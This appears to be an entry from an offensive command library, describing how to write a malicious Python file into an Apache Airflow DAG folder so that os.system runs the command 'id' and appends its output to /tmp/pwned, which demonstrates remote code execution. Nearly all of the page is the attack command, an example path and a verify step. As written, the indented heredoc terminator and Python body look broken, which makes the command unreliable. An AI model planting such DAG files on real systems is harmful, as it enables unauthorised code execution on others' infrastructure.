---
data: |-
  (cat <<'EOF'
   import os
   os.system("id >>/tmp/pwned")
   from airflow import DAG
   EOF
   ) > $TARGET/dags/poc.py
tags:
  - injection
  - python
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.457Z'
id: 07137f67-371a-4d2e-bda3-17cd4428c40c
verified: false
validated: true
submitted: true
---
# write-malicious-dag

## Command

```bash
(cat <<'EOF'
 import os
 os.system("id >>/tmp/pwned")
 from airflow import DAG
 EOF
 ) > $TARGET/dags/poc.py
```

## Description

Uses heredoc with cat to write malicious Python code to poc.py, injecting RCE via os.system and a DAG import.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<<'EOF'` | Heredoc delimiter | Yes |
| `> $TARGET/dags/poc.py` | Redirect to target file | Yes |

## Examples

### Basic Usage

```bash
(cat <<'EOF'
 import os
 os.system("id >>/tmp/pwned")
 from airflow import DAG
 EOF
 ) > /home/airflow/dags/poc.py
```

### Verify

```bash
cat /home/airflow/dags/poc.py
```

## Expected Output

No output; file created.

## Related

- [[commands/os-system-id]]
